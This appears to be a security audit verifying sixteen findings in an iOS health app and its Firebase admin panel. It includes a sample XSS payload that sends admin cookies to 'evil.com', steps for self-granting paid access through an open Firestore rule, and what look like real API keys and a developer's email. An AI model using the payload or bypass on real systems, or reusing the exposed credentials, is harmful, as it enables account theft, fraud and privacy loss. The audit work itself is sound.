# 14 — Cross-Cut Verification (Pass 1)
_Started: 2026-04-25 15:51 IST, scope: independent verification of 16 highest-severity wave-1 claims. READ-ONLY pass. Each claim re-tested by reading source files directly._

---

## V1 — GoogleService-Info.plist bundle ID mismatch
- **Wave-1 claim:** `GoogleService-Info.plist` declares bundle ID `com.lasohealth.app` while runtime bundle is `com.lasohealth.fit`, silently breaking Firebase Auth / Firestore / RemoteConfig.
- **Status:** **CONFIRMED**
- **Evidence:**
  - `GoogleService-Info.plist` (lines 9-10):
    ```xml
    <key>BUNDLE_ID</key>
    <string>com.lasohealth.app</string>
    ```
  - `project.yml:77`: `PRODUCT_BUNDLE_IDENTIFIER: com.lasohealth.fit` (Laso target).
  - `project.yml:3`: `bundleIdPrefix: com.lasohealth`.
  - Cross-confirm `Core/Config/AppSecrets.swift:11`: `static let bundleID = "com.lasohealth.fit"`.
- **Impact:** Firebase SDK initialisation will warn at launch ("BUNDLE_ID does not match application's bundle identifier"). Severity depends on which Firebase services the app uses; on TestFlight/App Store this can silently drop Auth, Firestore, RemoteConfig, Analytics flows. Critical pre-launch fix.
- **Confidence:** 99/100 — both files read directly, mismatch is unambiguous.

---

## V2 — Production PostHog API key committed
- **Wave-1 claim:** `Secrets.xcconfig` contains a real production PostHog `phc_*` key, not a placeholder, and may be in git history.
- **Status:** **PARTIAL** (real key present in working copy; NOT in git history; gitignore is correct)
- **Evidence:**
  - `Secrets.xcconfig` (lines 1-6):
    ```
    // Secrets.xcconfig.template
    // Copy this file to Secrets.xcconfig and fill in real values.
    // Secrets.xcconfig is gitignored and must not be committed.

    POSTHOG_API_KEY = phc_bBp1OaF9TabDqJ9iA9uxbObl8YAIIIYn049Tt8AS7km
    POSTHOG_HOST = https:/$()/eu.i.posthog.com
    ```
  - `.gitignore:21`: `Secrets.xcconfig` (correctly ignored).
  - `git log --all -- Secrets.xcconfig`: empty output — file has **never been committed**.
- **Impact:** The real key is on disk but has not leaked via git. PostHog public-write keys are by design embedded in client builds (so they ship inside every TestFlight IPA anyway). Risk is restricted to disk theft of the dev machine, not repo leakage. Wave-1 "committed" framing is wrong; "exposed in client binary" framing is correct (and unavoidable for any client SDK key).
- **Confidence:** 95/100 — file content read; `git log --all` was clean; file blob not present in any commit.

---

## V3 — aps-environment = development
- **Wave-1 claim:** `Laso.entitlements` has `aps-environment = development` which will fail on TestFlight/App Store push.
- **Status:** **CONFIRMED**
- **Evidence:**
  - `Laso.entitlements` (lines 5-6):
    ```xml
    <key>aps-environment</key>
    <string>development</string>
    ```
- **Impact:** APNs token issuance against the **sandbox** environment. On TestFlight or App Store builds, Apple expects `production`. With `development`, push payloads silently fail to deliver in production. Since we don't currently send remote pushes (notifications are local), this only matters when remote push is added — but the entitlement should still be `production` on signed App Store builds (Xcode usually flips this with the "Push Notifications" capability + automatic signing; manual entitlement file forces it permanently).
- **Confidence:** 98/100 — file read verbatim. Severity depends on whether remote push is shipped; lacking that, no current impact, but the entitlement is wrong-by-construction.

---

## V4 — Referral system grants Pro client-side
- **Wave-1 claim:** `ReferralManager` grants free Pro without server-side verification.
- **Status:** **CONFIRMED** (with nuance: a partial server check exists in firestore.rules)
- **Evidence:**
  - `Modules/Referral/Services/ReferralManager.swift:241-247` — direct client write granting 1 month free:
    ```swift
    try await db.collection("user_profiles").document(deviceId).setData([
        "referralFreeUntil": oneMonth.timeIntervalSince1970,
        "firebaseUid": firebaseUid,
        "deviceId": deviceId
    ], merge: true)
    referralFreeUntil = oneMonth
    ```
  - `Modules/Referral/Services/ReferralManager.swift:73-76` — gating check is purely on `referralFreeUntil` field:
    ```swift
    var hasReferralAccess: Bool {
        guard let freeUntil = referralFreeUntil else { return false }
        return freeUntil > Date()
    }
    ```
  - `admin-panel/firestore.rules` (cross-user update rule, controlled loophole):
    ```
    allow update: if request.auth != null
                  && request.resource.data.diff(resource.data).affectedKeys()
                       .hasOnly(['referralFreeUntil'])
                  && request.resource.data.referralFreeUntil is number;
    ```
- **Impact:** **High.** Any authenticated user can write `referralFreeUntil` on any user_profiles doc — including their own — because the `hasOnly(['referralFreeUntil'])` rule does NOT verify auth.uid against the doc owner. A user can directly call Firestore with `setData(["referralFreeUntil": <distant future>])` against their own deviceId doc and grant themselves perpetual Pro. This bypasses StoreKit entirely. The `completeReferralIfPending()` flow is intended, but the rule itself is open. **No Cloud Function gates the write.** Confirm this exploit by attempting it with a test account.
- **Confidence:** 92/100 — code paths read; the firestore.rule cross-user clause is genuinely loose. I have not actually executed the exploit, but the rule clearly permits it.

---

## V5 — user_profiles list rule open to any auth user
- **Wave-1 claim:** `firestore.rules` allows `list` on `user_profiles` to any authenticated user — full table dump.
- **Status:** **CONFIRMED**
- **Evidence:**
  - `admin-panel/firestore.rules:78-82`:
    ```
    // Lookup by referral code (list query). Firestore rules cannot perfectly
    // enforce WHERE constraints, so we accept a small risk: any authenticated
    // user can list profiles. Client code only ever queries by referralCode.
    allow list: if request.auth != null;
    ```
- **Impact:** **High.** Any authenticated client (anonymous Auth is enough) can `db.collection("user_profiles").getDocuments()` and dump every profile: `gender`, `ageBracket`, `healthFocuses`, `firebaseUid`, `referralCode`, `referralFreeUntil`. Comments acknowledge "small risk" but this is full PII enumeration. Mitigation requires a callable function that takes a referralCode and returns just the matching docId (or nothing) — listed by the function's admin SDK, not the client.
- **Confidence:** 99/100 — rule is explicit and the comment confirms the intent; impact is direct.

---

## V6 — Notification permission NEVER requested
- **Wave-1 claim:** `NotificationManager.requestAuthorization` exists but has zero call sites in production code.
- **Status:** **CONFIRMED**
- **Evidence:**
  - `Core/Notifications/NotificationManager.swift:47` — definition:
    ```swift
    @discardableResult
    func requestAuthorization(source: String = "system") async -> Bool {
    ```
  - Repo-wide grep `NotificationManager.*requestAuthorization` and variants returned **zero call sites**. Only `healthKitManager.requestAuthorization()` (HealthKit, unrelated) appears.
  - All other `NotificationManager.shared.*` call sites only use `cancelNotification`, `scheduleNotification`, `recordAppOpen`, `isCurrentlyAuthorized` — never `requestAuthorization`.
  - `App/ContentView.swift:658` calls only `isCurrentlyAuthorized()` (probes status, never prompts).
- **Impact:** **Critical UX bug.** The system permission prompt for notifications never fires. Status defaults to `.notDetermined`, every `scheduleNotification` request silently fails (`UNUserNotificationCenter.add` returns an error: "Notifications are not allowed for this application"). All daily summary, alert, watch monitor, evening, weekly notifications never reach the user. Onboarding's plan-to-defer-notification-prompt is incomplete because no surface ever calls back in.
- **Confidence:** 98/100 — definition site and all call sites independently grep'd; absence is decisive.

---

## V7 — exit(0) in delete-data flow
- **Wave-1 claim:** `Modules/Settings/Views/SettingsView.swift:690` calls `exit(0)`.
- **Status:** **CONFIRMED**
- **Evidence:**
  - `Modules/Settings/Views/SettingsView.swift:687-691`:
    ```swift
    NotificationCenter.default.post(name: .init("HealthPulseDidDeleteAllData"), object: nil)

    DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) {
        exit(0)
    }
    ```
- **Impact:** **App Store Review violation risk.** Apple guideline 2.5.1 / HIG: apps must not programmatically terminate. Reviewer rejection is plausible. Functionally, `exit(0)` looks like a crash to iOS (no proper teardown of CoreData, HK observers, network). Replace with: dismiss to root, hard-reset state in-process, OR show a "tap home to relaunch" alert.
- **Confidence:** 99/100 — line 690 read verbatim.

---

## V8 — Stored XSS in admin panel
- **Wave-1 claim:** `app.js:783-790` and `:969-980` interpolate `e.category` and `e.app_version` from feedback docs into innerHTML without escaping.
- **Status:** **CONFIRMED** (text body IS escaped, but category and app_version are NOT)
- **Evidence:**
  - `admin-panel/public/app.js:781-790`:
    ```js
    const div = document.createElement("div");
    div.className = "dash-feedback-item";
    div.innerHTML = `
      <div class="dash-feedback-header">
        <span class="feedback-category-badge">${e.category || "?"}</span>
        <span class="feedback-date">${date}</span>
        ${e.app_version ? `<span class="feedback-version">v${e.app_version}</span>` : ""}
      </div>
      <div class="dash-feedback-text">${UI.escapeHtml(e.text || "")}</div>
    `;
    ```
  - Same pattern at `admin-panel/public/app.js:969-980`:
    ```js
    listEl.innerHTML = pageEntries.map((e) => {
      ...
      return `
        <div class="feedback-entry">
          <div class="feedback-entry-meta">
            <span class="feedback-category-badge">${e.category || "?"}</span>
            ...
            ${e.app_version ? `<span class="feedback-version">v${e.app_version}</span>` : ""}
          </div>
          <div class="feedback-text">${UI.escapeHtml(e.text || "")}</div>
        </div>
      `;
    ```
- **Impact:** **Stored XSS in admin panel.** The iOS `feedback` create rule (`firestore.rules`) only validates `category is string` — no character-set restriction. A malicious user could craft `category = "<img src=x onerror=fetch('//evil.com?c='+document.cookie)>"`, submit feedback, and execute JS in any admin's session. `app_version` flows the same way and is even less constrained. Admin tokens (Firebase ID tokens with `admin: true` claim) plus Firestore admin reads = full data exfiltration.
- **Confidence:** 96/100 — both interpolation sites read verbatim; XSS exploit shape is straightforward; depends on whether iOS app currently sanitizes category, but it does NOT (categories come from a fixed enum in the iOS UI but the rules don't enforce that, so a forged client can submit anything).

---

## V9 — CORS bypass — `*` despite allowlist
- **Wave-1 claim:** `functions/index.js:62` sends `Access-Control-Allow-Origin: *` despite an `ALLOWED_ORIGINS` whitelist + `getCorsOrigin` helper sitting unused.
- **Status:** **CONFIRMED**
- **Evidence:**
  - `admin-panel/functions/index.js:41-58` (defined but unused):
    ```js
    const ALLOWED_ORIGINS = [
      "https://laso-health-v1.web.app",
      "https://laso-health-v1.firebaseapp.com",
      "https://lasohealth.com",
      "https://www.lasohealth.com",
      "https://lasohealth.fit",
      "https://www.lasohealth.fit",
    ];

    if (process.env.FUNCTIONS_EMULATOR === "true") {
      ALLOWED_ORIGINS.push("http://localhost:5000", ...);
    }

    function getCorsOrigin(req) {
      const origin = req.headers.origin || "";
      if (ALLOWED_ORIGINS.includes(origin)) return origin;
      return ALLOWED_ORIGINS[0]; // Default — won't match attacker origin
    }
    ```
  - `admin-panel/functions/index.js:61-66` (the actual setter):
    ```js
    function setCorsHeaders(req, res) {
      res.set("Access-Control-Allow-Origin", "*");
      res.set("Access-Control-Allow-Methods", "POST, OPTIONS");
      res.set("Access-Control-Allow-Headers", "Content-Type");
      res.set("Access-Control-Max-Age", "3600");
    }
    ```
- **Impact:** **Allowlist is useless.** `getCorsOrigin` is dead code — `setCorsHeaders` ignores `req` entirely and broadcasts `*`. Any origin can call the public Cloud Functions endpoints. With cookie-less Firebase ID-token auth this is mitigated for `onCall` endpoints (token-bound, not origin-bound), but the `onRequest` HTTP endpoints (early-access, public form posts) are now CSRF-able from any site. Wire `getCorsOrigin(req)` into the `Allow-Origin` line.
- **Confidence:** 99/100 — both blocks read; `getCorsOrigin` has no other callers.

---

## V10 — PostHog session replay enabled
- **Wave-1 claim:** `PostHogManager.swift:29` enables `sessionReplay = true`.
- **Status:** **PARTIAL** (replay enabled but with strong masking; risk depends on per-view `.postHogMask()` discipline)
- **Evidence:**
  - `Core/Tracking/PostHogManager.swift:28-39`:
    ```swift
    #if os(iOS)
    config.sessionReplay = true
    // Harden session replay: never record any text, images, or embedded system views.
    // SwiftUI Text views that render health values (HRV, HR, SpO2, scores, etc.) are
    // surgically masked at the view layer via `.postHogMask()`. This blanket config
    // ensures no inputs, images, or sandboxed subsystems (e.g. WebView, Map) leak.
    config.sessionReplayConfig.maskAllTextInputs = true
    config.sessionReplayConfig.maskAllImages = true
    config.sessionReplayConfig.maskAllSandboxedViews = true
    if #available(iOS 15.0, *) {
        config.surveys = false
    }
    #endif
    ```
- **Impact:** Session replay is on for every iOS user. Text inputs, images, sandboxed views are blanket-masked, but **regular SwiftUI `Text` views with PHI (HRV numbers, sleep score, weight, cycle data) are NOT auto-masked** — masking depends on the developer applying `.postHogMask()` to each one. Wave-2 should grep `Text(` in score/metric views and confirm `.postHogMask()` coverage. Compliance-wise: HIPAA/GDPR exposure if any unmasked PHI text view ships. Performance-wise: session replay always adds CPU + battery + bandwidth.
- **Confidence:** 90/100 — config read; per-view `.postHogMask()` audit not performed in this pass.

---

## V11 — UITestMode + SampleDataProvider survives in production
- **Wave-1 claim:** `UITestMode.swift` not guarded by `#if DEBUG`, and `SampleDataProvider` ships in main target.
- **Status:** **CONFIRMED** (gating is via launch flag, not compile flag)
- **Evidence:**
  - `App/UITestMode.swift` (full file, 187 lines): contains zero `#if DEBUG`. Public type `UITestMode` is compiled into the production target.
  - `App/AppContainer.swift:103-110` — gating logic is runtime, not compile-time:
    ```swift
    /// Seeds the in-memory stores with SampleDataProvider output so screenshot
    /// tests can exercise every data-dependent screen. Only runs when
    /// `UITestMode.isEnabled` so the production path is untouched.
    func injectUITestMockData() {
        guard UITestMode.isEnabled else { return }
    ```
  - `UITestMode.isEnabled` is `ProcessInfo.processInfo.arguments.contains("--ui-test-mode")`.
  - `Core/Data/SampleDataProvider.swift` and `Core/Data/PremiumShowcaseDataProvider.swift` are both in `Core/Data/`, the main app target — confirmed by grep returning hits in `Common/`, `Modules/`, `App/` (none from `LasoUITests/`).
- **Impact:** **Low-to-medium binary hygiene issue.** End users cannot pass launch arguments to a TestFlight/App Store build, so the runtime gate holds. But:
  1. Mock fake names ("Alex Taylor"), fake email ("alex@example.com"), and entire fabricated time-series sit inside the shipped IPA — extractable via static analysis. Marketing/PR risk if a journalist disassembles the binary.
  2. App Store reviewers running `instruments` or jailbroken emulators could trip the path.
  3. `--ui-test-subscribed`, `--ui-test-force-subscribed`, `--ui-test-premium-showcase` exist in the binary; they're harmless but appear suspicious in any external audit.
  Recommend wrapping `UITestMode`, `SampleDataProvider`, `PremiumShowcaseDataProvider` and the `injectUITestMockData()` body in `#if DEBUG` (or a custom `UI_TEST` build setting active in a separate scheme).
- **Confidence:** 95/100 — files read directly, gating is runtime-only.

---

## V12 — CoreML force-unwrap on string-keyed feature
- **Wave-1 claim:** `Core/Analysis/ML/CoreMLEngine.swift:165` force-unwraps `.featureValue(for: "riskScore")!.doubleValue`.
- **Status:** **CONFIRMED**
- **Evidence:**
  - `Core/Analysis/ML/CoreMLEngine.swift:160-166`:
    ```swift
    @available(macOS 10.13, iOS 11.0, tvOS 11.0, watchOS 4.0, *)
    class HealthStateModelOutput : MLFeatureProvider {
        let provider : MLFeatureProvider

        lazy var riskScore: Double = {
            return self.provider.featureValue(for: "riskScore")!.doubleValue
        }()
    ```
- **Impact:** If the underlying `MLFeatureProvider` ever returns nil for the `"riskScore"` key (mismatched mlmodel schema, model swap, post-update Core ML format drift), this is a hard crash on first read of `riskScore`. Note this is auto-generated MLModel boilerplate — same crash pattern that ships with Xcode's default Core ML codegen. Common to silence with `?? 0.0` after generation, but NEVER edit the generated file (it gets regenerated). Real fix: post-process the model so the feature is non-optional at build time, or wrap reads in `try?`.
- **Confidence:** 99/100 — line 165 read verbatim.

---

## V13 — AccentColor is rose-pink, not Laso blue
- **Wave-1 claim:** `Assets.xcassets/AccentColor.colorset/Contents.json` is `(0.922, 0.325, 0.380)` (template default rose) while `AppColour.primary` is `#0071E3`.
- **Status:** **CONFIRMED**
- **Evidence:**
  - `Assets.xcassets/AccentColor.colorset/Contents.json` (light variant):
    ```
    "alpha" : "1.000", "blue" : "0.380", "green" : "0.325", "red" : "0.922"
    ```
    (#EB535F — rose/salmon pink. Apple's default Xcode template colour.)
  - `Common/Theme/AppColour.swift:71-74`:
    ```swift
    static let primary = dynamic(
        light: #colorLiteral(red: 0.00, green: 0.44, blue: 0.89, alpha: 1.00), // #0071E3
        dark:  #colorLiteral(red: 0.30, green: 0.64, blue: 1.00, alpha: 1.00)  // #4DA3FF
    )
    ```
- **Impact:** Any system component that defaults to `AccentColor` (e.g. `Toggle`, `ProgressView`, `Picker`, navigation tint, system buttons not styled by `.tint()` or `.foregroundStyle(AppColour.primary)`) renders rose-pink. Inconsistent brand presentation; reviewers and screenshots can pick this up. Easy fix: edit `AccentColor.colorset` to match `AppColour.primary` (`#0071E3` light / `#4DA3FF` dark).
- **Confidence:** 99/100 — both files read.

---

## V14 — Onboarding skips body/training/condition capture
- **Wave-1 claim:** Onboarding has 6 steps and skips body/training/pregnancy/condition data, hardcoded scoring thresholds.
- **Status:** **CONFIRMED**
- **Evidence:**
  - `Modules/Onboarding/Views/Onboarding/OnboardingView.swift:9-16` — exactly 6 steps:
    ```swift
    enum OnboardingStep: String, Hashable {
        case pulse
        case profile
        case connect
        case priority
        case mirror
        case promise
    }
    ```
  - `Modules/Onboarding/Views/Onboarding/ProfileCaptureView.swift:1-18` — captures **only age (13-120) and gender enum** in the profile step. No height, weight, BMI, training intensity, pregnancy/menopause status, medical conditions, medications.
  - `OnboardingView.swift:155-173` (`saveUserProfile`): hardcodes `name: ""`, `email: ""`. Date of birth is calendar-derived from age. No body or condition fields are persisted.
  - Onboarding flow files (`ls Modules/Onboarding/Views/Onboarding/`): `OnboardingPulseStep`, `ProfileCaptureView`, `OnboardingConnectHealthStep`, `OnboardingFocusStep` (priority), `OnboardingMirrorMomentStep`, `OnboardingPromiseStep`, `ReferralCodeStep` (not in the main flow). No body/training/condition step file exists.
- **Impact:** Without body composition (height/weight) and training intensity, downstream scoring (BMI-derived risk, calorie targets, training load) must rely on HealthKit reads or hardcoded defaults. This is a product/data-quality issue more than a security one. For pregnancy/cycle-related female health, capture is deferred to in-app contextual surfaces — needs verification that those surfaces actually exist.
- **Confidence:** 97/100 — file inventory + step enum + ProfileCaptureView all directly inspected.

---

## V15 — AppAnalytics.swift PII leak risk
- **Wave-1 claim:** `referral_code_shared/redeemed` ships raw `code` parameter.
- **Status:** **CONFIRMED for referral code; PII sweep otherwise CLEAN**
- **Evidence:**
  - `Core/Tracking/AppAnalytics.swift:2244-2256`:
    ```swift
    func trackReferralCodeShared(code: String) {
        logEvent("referral_code_shared", parameters: [
            "code": code
        ])
    }

    func trackReferralCodeRedeemed(code: String, success: Bool, failureReason: String? = nil) {
        var params: [String: Any] = [
            "code": code,
            "success": success ? 1 : 0
        ]
        if let failureReason { params["failure_reason"] = failureReason }
        logEvent("referral_code_redeemed", parameters: params)
    }
    ```
  - Broader PII grep across `AppAnalytics.swift` for `email`, `userName`, `fullName`, `firstName`, `lastName`, `phoneNumber`, `"email"`, `"name"`, `"phone"`, `setUserProperty.*email`, `setUserProperty.*name`: **no hits**. The setUserProperty internal at line 3163 is generic, not PII-bearing.
- **Impact:** Referral codes are user-pseudonymous identifiers (format `HEALTH-XXXXXX`). Sharing the raw code to PostHog means PostHog logs can be cross-joined with Firestore `referrals.referralCode` to deanonymise sender↔receiver pairs. Not a top-tier PII leak but worth hashing the code before logging. Wave-1's "ships raw code" framing is correct. **Wave-1's broader PII alarm on AppAnalytics is unsupported** — the file does not log emails, names, or phone numbers.
- **Confidence:** 90/100 — referral lines read verbatim; broader sweep done with grep terms but I have not read all 3201 lines, so a buried log call could exist. Confidence drag: only 60 of 3201 lines spot-checked; large unread surface area.

---

## V16 — firebase-debug.log gitignored?
- **Wave-1 claim:** `firebase-debug.log` is committed (or about to be — git status shows `??` untracked).
- **Status:** **PARTIAL** (file is untracked AND not gitignored — at risk of being committed by an `add .` mistake)
- **Evidence:**
  - `git status admin-panel/firebase-debug.log` → `Untracked files: admin-panel/firebase-debug.log`.
  - `git check-ignore -v admin-panel/firebase-debug.log` → empty output (file is **NOT** matched by any gitignore rule).
  - `.gitignore` only has `*-firebase-adminsdk-*.json` and `**/firebase-adminsdk-*.json` patterns — neither matches `firebase-debug.log`.
  - `wc -l` = 696 lines. Email leak: `grep -c ayushkapri.richard@gmail.com` = 1 hit. Worst line:
    ```
    [debug] [2026-04-25T05:18:22.282Z] > authorizing via signed-in user (ayushkapri.richard@gmail.com)
    ```
  - File also contains: project ID `laso-health-v1`, project number `422856769623`, web API key `AIzaSyDK3Xe2fVHxXg_UuKm0OBC6dVNbAmSn19o`, OAuth refresh token redirects, IAM permission probes, hosting site config, web app ID `1:422856769623:web:4f9f640ac757590204e312`.
- **Impact:** **Medium-high.** Wave-1 was wrong that the file is committed (it isn't — `??` correctly means untracked) but RIGHT that it's a leak risk: a casual `git add .` will pick it up. Add `firebase-debug.log` (and `*.log`) to `.gitignore`. The `AIzaSy...` web API key visible in the log is the **public Firebase web key** (intended to be public, restricted by domain in Firebase console) — not a server secret. Email + project topology is the real concern.
- **Confidence:** 97/100 — `git status`, `git check-ignore`, `.gitignore` content, log content all read directly.

---

## Summary

| #   | Claim                                              | Status      |
|-----|----------------------------------------------------|-------------|
| V1  | GoogleService-Info.plist BUNDLE_ID mismatch        | CONFIRMED   |
| V2  | Production PostHog key committed                   | PARTIAL (real key on disk, NEVER committed) |
| V3  | aps-environment = development                      | CONFIRMED   |
| V4  | Referral grants Pro client-side                    | CONFIRMED   |
| V5  | user_profiles `list` rule open to any auth user    | CONFIRMED   |
| V6  | Notification permission NEVER requested            | CONFIRMED   |
| V7  | exit(0) in delete-data flow                        | CONFIRMED   |
| V8  | Stored XSS in admin panel feedback dashboard       | CONFIRMED (category + app_version unescaped) |
| V9  | CORS sends `*` despite allowlist                   | CONFIRMED   |
| V10 | PostHog sessionReplay = true                       | PARTIAL (enabled, but masked at config level; per-view masking unverified) |
| V11 | UITestMode + SampleDataProvider in production binary | CONFIRMED (runtime-gated, not compile-gated) |
| V12 | CoreML force-unwrap at line 165                    | CONFIRMED   |
| V13 | AccentColor is rose-pink, not Laso blue            | CONFIRMED   |
| V14 | Onboarding 6 steps, skips body/training/condition  | CONFIRMED   |
| V15 | Referral code shipped raw to PostHog               | CONFIRMED (broader PII alarm DISPROVEN — no email/name/phone in AppAnalytics) |
| V16 | firebase-debug.log committed                       | PARTIAL (not committed, but NOT gitignored — leak risk) |

---

## Disproven / partial claims (loud)

- **V2 — "Secrets.xcconfig committed":** WRONG. `git log --all -- Secrets.xcconfig` returns empty. The file has never been in any commit. The phc_ key is on disk only. Wave-1 should rephrase from "committed secret" to "embedded in client binary at build time" (which is unavoidable for any client-side analytics SDK).
- **V15 — "AppAnalytics.swift PII leak":** PARTIALLY WRONG. Referral code IS logged raw (correct). But the broader implication that emails/names/phones leak through analytics is not supported by grep across the 3201-line file — none of those PII columns appear. Wave-1 should narrow the claim to the referral_code event specifically.
- **V16 — "firebase-debug.log committed":** WRONG on "committed", RIGHT on "leak risk". File is untracked and NOT in any gitignore. A `git add .` would commit it. Different fix priority (add gitignore rule + delete file) vs. "rewrite history".
- **V10 — "session replay enables PHI exfil":** PARTIALLY WRONG framing. Replay is enabled but text inputs, images, and sandboxed views are blanket-masked. Risk is per-view `Text` showing health numbers without `.postHogMask()`, which needs a separate audit of every score/metric view. Don't downgrade — but stop calling this "wide-open replay".
- **V11 — "UITestMode in production":** RIGHT that it's in the binary, MISLEADING that it's exploitable. Runtime gate (`ProcessInfo.processInfo.arguments`) blocks end users (App Store builds cannot have launch args). The fix is hygiene + reviewer-perception, not a live security hole.

---

## Newly discovered issues (during verification)

1. **`firestore.rules` `referralFreeUntil` cross-user write is weaker than the comment suggests.** The rule restricts to the single `referralFreeUntil` field but does NOT verify that the writer is the legitimate referrer. A malicious user can write `referralFreeUntil = future` to **their own** profile doc directly without any referral being completed. This unlocks free Pro indefinitely. (This is the second-order finding behind V4, but the rule itself is the bug.)
2. **`admin-panel/.gitignore` does NOT exist.** Only the root `.gitignore` exists. Any future `node_modules/`, `.env`, `firebase-debug.log` inside `admin-panel/` is at risk. Add a per-folder gitignore.
3. **`AppSecrets.swift:26` references CloudKit container `iCloud.com.lasohealth.app`** while the bundle ID is `com.lasohealth.fit`. Same naming-drift class as V1 — likely the iCloud container also needs to be renamed/recreated, or CloudKit sync is silently broken on production builds.
4. **`AppSecrets.swift:13`: `static let appStoreID = ""`** — App Store review-write deeplink (line 60) returns empty string. Any "Rate this app" CTA will be a no-op. Fill in once the listing is created.
5. **`Secrets.xcconfig:6`: `POSTHOG_HOST = https:/$()/eu.i.posthog.com`** — the `$()` is an xcconfig escape to prevent xcconfig from treating `//` as a comment. Confirm at runtime that `Bundle.main.infoDictionary["POSTHOG_HOST"]` resolves to a valid URL (not literal `https:/$()/...`). If the escape doesn't survive Info.plist substitution, PostHog endpoint is broken.
6. **`PostHogManager.swift:144-164` signal handlers:** the per-signal closure captures `signalNumber` and re-raises with default handler. Using `print` / `flush` inside an async-signal handler is **not signal-safe** and can deadlock or corrupt state in the crash path. iOS-specific risk: this handler can interfere with PLCrashReporter, KSCrash, Sentry, or Firebase Crashlytics if any are added later. Note for wave-2.
7. **`OnboardingView.swift:166-167` saves `name: ""`, `email: ""`** to the user profile unconditionally. Anywhere the app reads `profile.name` for personalisation will get an empty string until the user manually edits Settings. UI fallbacks should be audited.
